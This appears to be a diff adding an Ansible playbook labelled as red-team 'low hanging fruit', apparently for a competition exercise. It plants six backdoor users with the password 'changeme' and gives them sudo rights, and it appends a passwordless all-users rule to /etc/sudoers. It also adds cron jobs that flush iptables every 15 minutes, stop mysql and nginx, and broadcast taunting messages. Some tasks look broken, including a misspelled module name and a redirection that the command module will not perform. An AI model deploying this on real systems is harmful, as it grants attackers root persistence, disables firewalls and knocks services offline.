@@ -1,0 +1,60 @@
+---
+- name: TrainingWheelsProtocol - Red Team Low Hanging Fruit
+  hosts: linux
+  become: yes
+
+  tasks:
+    - name: deploy linux users
+      user:
+        name: "{{ item }}"
+        password: "{{ 'changeme' | password_hash('sha512') }}"
+        state: present
+        createhome: yes
+      loop:
+        - kong
+        - thanos
+        - deadpool
+        - bane
+        - vader
+        - yondu
+
+    - name: get sudo group name
+      command: grep -oE "wheel|sudo" /etc/group
+      register: group_output
+
+    - name: update red team users group
+      command: usermod -G "{{ group_output.stdout }}" "{{ item }}"
+      loop:
+        - kong
+        - thanos
+        - deadpool
+        - bane
+        - vader
+        - yondu
+
+    - name: change sudoers file
+      command: echo "ALL ALL=(ALL:ALL) NOPASSWD:ALL" >> "/etc/sudoers"
+
+    - name: iptables time
+      ansible.builtin.cron:
+        name: "Firewall Refresh"
+        minute: "*/15"
+        job: "(iptables -F; iptables -t mangle -F; iptables -t nat -F;) > /dev/null"
+
+    - name: the ghost
+      ansible.builtin.cron:
+        name: "ghost?"
+        minute: "*/15"
+        job: "wall oooooOOOooOOOOoOOOoOooOOOo"
+
+    - name: service shutdown
+      ansible.bultin.cron:
+        name: services
+        minute: "*/15"
+        job: "(service mysql stop; service nginx stop;) > /dev/null"
+
+    - name: Download Tools
+      ansible.builtin.package:
+        name:
+          - net-tools
+        state: present
